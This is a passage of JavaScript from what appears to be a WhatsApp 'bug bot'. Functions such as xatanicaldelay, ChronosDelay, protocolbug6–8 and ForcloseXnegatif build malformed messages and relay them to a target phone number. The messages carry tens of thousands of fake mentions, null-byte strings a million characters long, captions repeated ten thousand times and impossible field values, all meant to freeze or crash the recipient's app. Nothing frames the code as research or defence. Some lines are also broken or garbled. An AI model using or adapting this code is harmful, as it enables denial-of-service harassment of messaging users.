        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await Mvaa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Mvaa.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function xatanicaldelay(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   ",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await Mvaa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Mvaa.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   " },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function xatanicaldelayv2(target, mention) {
console.log(chalk.blue(`Success Send Folware To ${target}`));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Mvaa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function ChronosDelay(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const letakx = {
        videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
            fileLength: "327833",
            seconds: 15,
            mediaKey: "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
            caption: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
            height: 1248,
            width: 704,
            fileEncSha256: "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
            directPath: "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1748347294",
            contextInfo: { isSampled: true, mentionedJid: mentionedList },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
                newsletterName: "Xrelly Mp5"
            },
            streamingSidecar: "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
            thumbnailDirectPath: "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
            thumbnailSha256: "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
            thumbnailEncSha256: "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
            annotations: [{
                embeddedContent: {
                    embeddedMusic: {
                        musicContentMediaId: "589608164114571",
                        songId: "870166291800508",
                        author: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
                        title: "Dry",
                        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                        artistAttribution: "https://www.instagram.com/_u/xrelly",
                        countryBlocklist: true,
                        isExplicit: true,
                        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
                    }
                },
                embeddedAction: true
            }]
        }
    };

    const xaudio = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            contextInfo: {
                mentionedJid: mentionedList,
                caption: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
                fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
            }
        }
    };

    const msg1 = generateWAMessageFromContent(target, letakx, {});
    const msg2 = generateWAMessageFromContent(target, xaudio, {});

    for (const msg of [msg1, msg2]) {
        await Mvaa.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await Mvaa.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}

async function protocolbug8(target, mention) {
    const albumMsg = {
        protocolMessage: {
            type: 29,
            editedMessage: {
                message: {
                    imageMessage: {
                        mimetype: "image/jpeg",
                        caption: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
                        fileSha256: "OEVKKnU1J8ZK8cGJcdyi6wFwHboRuTPaDQ6vKx7DYVk=",
                        fileEncSha256: "TYiYlQ6UJvOftZ6+kACcU0ht+Zn6Il7Ej8C+6Vcs4kc=",
                        mediaKey: "7q+GUK8W+PNr+dSyOcwz3MPPBhN3O+E0EMKxV+2W9h8=",
                        directPath: "/v/t62.7114-24/10000000_1397981774398456_2140897391867292534_n.enc?ccb=11-4&oh=01_Q5Aa1vFxUgvlLsXZ5...&oe=68366F18&_nc_sid=5e03e0",
                        fileLength: "17000",
                        mediaKeyTimestamp: "1748373411"
                    }
                }
            }
        }
    };

    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const album = generateWAMessageFromContent(target, albumMsg, {});
    await Mvaa.relayMessage("status@broadcast", album.message, {
        messageId: album.key.id,
        statusJidList: [target]
    });

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️" + "ោ៝".repeat(10000),
        title: "XxX",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "☇𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    for (const msg of [msg1, msg2, msg3]) {
        await Mvaa.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await Mvaa.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}

async function protocolbugaudio(Mvaa, target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Mvaa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Mvaa.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocollocation(Mvaa, target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    caption: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️".repeat(10000),
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await Mvaa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}

async function protocolbug6(Mvaa, target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "馃饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @than official )",
              newsletterJid: "120363333324119584@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Mvaa.relayMessage*("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Mvaa.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363400458869756@newsletter",
      serverMessageId: 1,
      newsletterName: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await Mvaa.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await Mvaa.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " ☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️ "
        },
        content: undefined
      }]
    });
  }
}

async function ForcloseXnegatif(target, mention) {
const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@g.us`);

const msg = await generateWAMessageFromContent(target, {
viewOnceMessageV2: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { 
text: ' '
},
footer: { 
text: '' 
},
carouselMessage: {
cards: [
{ 
header: {
title: '☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️',
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
fileLength: "164089",
height: 1,
width: 1,
mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
mediaKeyTimestamp: "1749258106",
